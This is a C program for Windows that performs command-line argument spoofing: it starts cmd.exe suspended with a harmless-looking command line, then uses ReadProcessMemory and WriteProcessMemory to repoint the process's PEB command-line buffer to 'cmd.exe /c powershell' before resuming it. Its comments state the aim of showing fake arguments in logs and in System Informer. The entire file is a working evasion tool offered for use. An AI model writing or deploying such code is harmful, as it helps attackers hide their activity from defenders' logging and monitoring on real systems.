#include <Windows.h>
#include <stdio.h>
#include "ntdll.h"
#pragma comment(lib, "ntdll")

// Arguments that get displayed in the logs
// System Informer will display the most recent modification, so if that's a
// concern, set this to a substring of the real arguments
LPCWSTR FakeCommandLine = L"cmd.exe";
// Path to real executable
LPCWSTR ImagePath = L"C:\\Windows\\System32\\cmd.exe";
// Real options we start the command with
LPCWSTR RealCommandLine = L"cmd.exe /c powershell";


int main(int argc, char** argv) {
    HANDLE hProcess, hThread = NULL;

    USHORT fakeCommandLineLength = lstrlenW(FakeCommandLine) * sizeof(WCHAR);
    USHORT realCommandLineLength = lstrlenW(RealCommandLine) * sizeof(WCHAR);

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessW(ImagePath, (PWSTR)FakeCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, L"C:\\Windows\\System32\\", &si, &pi)) {
        printf("Could not create new process.\n");
        return 1;
    }
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    // READ STARTUP INFO
    CONTEXT context;
    BOOL success;
    PROCESS_BASIC_INFORMATION pbi;
    DWORD retLen;
    SIZE_T bytesRead, bytesWritten;
    PEB pebLocal;
    RTL_USER_PROCESS_PARAMETERS parameters = { sizeof(parameters) };

    NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

    // Read the PEB from the target process
    success = ReadProcessMemory(hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
    if (!success) {
        printf("Could not call ReadProcessMemory to grab PEB\n");
        return 1;
    }

    // Grab the ProcessParameters from PEB
    ReadProcessMemory(hProcess, pebLocal.ProcessParameters, &parameters, sizeof(parameters), &bytesRead);
    if (parameters.CommandLine.Buffer == NULL) {
        printf("Commandline arguments appear to be null?\n");
        return 1;
    }
    //printf("New process commandline buffer: %d max, length %d.\n", parameters.CommandLine.MaximumLength, parameters.CommandLine.Length);

    HANDLE allocMemAddress = VirtualAllocEx(hProcess, NULL, realCommandLineLength, MEM_COMMIT, PAGE_READWRITE);
    if (allocMemAddress == NULL) {
        printf("Failed to allocate memory in new process.\n");
        return 1;
    }
    success = WriteProcessMemory(hProcess, allocMemAddress, RealCommandLine, realCommandLineLength, &bytesWritten);
    if (!success) {
        printf("Could not call WriteProcessMemory to write into new argument buffer.\n");
        return 1;
    }
    success = WriteProcessMemory(hProcess, pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Buffer), &allocMemAddress, sizeof(allocMemAddress), &bytesWritten);
    if (!success) {
        printf("Could not call WriteProcessMemory to update commandline args.\n");
        return 1;
    }

    // Resume thread execution
    ResumeThread(hThread);

    // Secuirty
    system("pause");
}